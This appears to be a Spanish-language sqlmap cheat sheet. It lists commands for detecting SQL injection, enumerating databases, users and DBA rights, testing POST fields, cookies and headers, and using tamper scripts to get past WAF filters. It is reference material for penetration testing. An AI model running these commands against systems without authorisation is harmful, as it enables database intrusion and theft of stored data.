Escaneo Básico

sqlmap -u "URL"Detección automática de inyección en URL
sqlmap -u "URL" --batchModo automático (no interactivo)
sqlmap -u "URL" -v 0Verbose 0 — solo resultados
sqlmap -u "URL" --bannerObtener banner de la BD
sqlmap -u "URL" --current-dbNombre de la BD actual
sqlmap -u "URL" --current-userUsuario actual de la BD
sqlmap -u "URL" --is-dbaVerificar si el usuario es DBA
sqlmap -u "URL" --dbsListar todas las bases de datos

Nivel y Riesgo

sqlmap -u "URL" --level=5Nivel de prueba máximo (1-5)
sqlmap -u "URL" --risk=3Riesgo máximo (1-3) — incluye OR-based
sqlmap -u "URL" --level=5 --risk=3Cobertura máxima

URLs con Parámetros

sqlmap -u "URL?id=1"Parámetro id vulnerable
sqlmap -u "URL?id=1" -p idForzar testing del parámetro id
sqlmap -u "URL?a=1&b=2" --skip="b"Saltar parámetro b
sqlmap -u "URL" --randomize="id"Randomizar valor del parámetro

POST Requests

sqlmap -u "URL" --data="user=admin&pass=*"Testing de formulario POST
sqlmap -u "URL" --data="user=admin&pass=*" -p userForzar testing del parámetro user
sqlmap -r request.txtUsar archivo de request (Burp export)
sqlmap -r request.txt -p userRequest file con parámetro forzado

Cookies

sqlmap -u "URL" --cookie="session=abc123"Inyectar vía cookie
sqlmap -u "URL" --cookie="session=*"Marcar cookie para testing
sqlmap -u "URL" --cookie="session=abc123" --level=2Level 2 incluye cookies en testing

Headers Custom

sqlmap -u "URL" --headers="X-Forwarded-For: *"Testing en header custom
sqlmap -u "URL" --referer="http://evil.com"Custom Referer header
sqlmap -u "URL" --user-agent="Mozilla/5.0"Custom User-Agent

Bypass WAF/IPS

sqlmap -u "URL" --tamper=space2commentEspacios → comentarios /**/
sqlmap -u "URL" --tamper=space2plusEspacios → +
sqlmap -u "URL" --tamper=charencodeURL encode todos los caracteres
sqlmap -u "URL" --tamper=between> → BETWEEN, = → LIKE
sqlmap -u "URL" --tamper=randomcaseRandomizar case de keywords

Combinaciones de Tamper

sqlmap -u "URL" --tamper=space2comment,randomcaseMúltiples tamper scripts
sqlmap -u "URL" --tamper=charencode,space2plusURL encode + spaces
sqlmap --list-tampersListar todos los tamper scripts
